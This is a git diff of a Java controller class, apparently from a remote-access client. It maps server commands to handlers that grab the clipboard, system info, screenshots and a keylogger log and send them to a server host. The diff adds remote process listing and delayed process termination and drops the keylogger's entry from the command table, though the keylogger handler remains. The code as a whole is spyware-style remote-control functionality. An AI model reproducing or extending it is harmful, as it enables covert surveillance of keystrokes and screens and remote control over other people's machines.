@@ -1,5 +1,6 @@
 package controllers;
 
+import client.Client;
 import models.MessageModel;
 import models.SystemInfoModel;
 import org.json.JSONArray;
@@ -13,9 +14,10 @@ import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.Optional;
+import java.lang.reflect.Array;
+import java.util.*;
+import java.util.concurrent.Future;
+import java.util.concurrent.TimeUnit;
 
 import static utils.Command.*;
 import static utils.Environment.DEFAULT_FROM;
@@ -32,13 +34,19 @@ public class Controller {
         put(COMMAND_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
-        put(COMMAND_KEYLOGGER, Controller::getKeylogger);
+        put(COMMAND_PROCESS, Controller::getProcess);
+        put(COMMAND_END_PROCESS, Controller::endProcess);
+    }
+
+    private static String endProcess(JSON input) {
+        Integer pid = input.getInt("pid");
+        long countdown = input.getLong("countdown");
+        Client.getExecutorService().schedule(()->ProcessHandle.of(pid).ifPresent(ProcessHandle::destroy), countdown, TimeUnit.MINUTES);
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_NORMAL).json();
     }
 
     private static String getKeylogger(JSON input) {
-        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_KEYLOGGER)
-                .put("keylogger", KeyLogger.getLog())
-                .json();
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_KEYLOGGER).put("keylogger", KeyLogger.getLog()).json();
     }
 
     private static String getScreen(JSON input) {
@@ -127,5 +135,16 @@ public class Controller {
 
     private static String text(Optional<?> optional) {
         return optional.map(Object::toString).orElse("-");
+    }
+
+    private static String getProcess(JSON input) {
+        JSONArray processes = new JSONArray();
+        ProcessHandle.allProcesses()
+                .filter(ph -> ph.parent().isPresent() && (ph.info().toString().length() > 2))
+                .forEach(process -> {
+                    String[] cmd = process.info().command().get().split("\\\\");
+                    processes.put(new JSON().put("pid", process.pid()).put("cmd", cmd[cmd.length-1]));
+                });
+        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST, COMMAND_PROCESS).put("processes", processes).json();
     }
 }
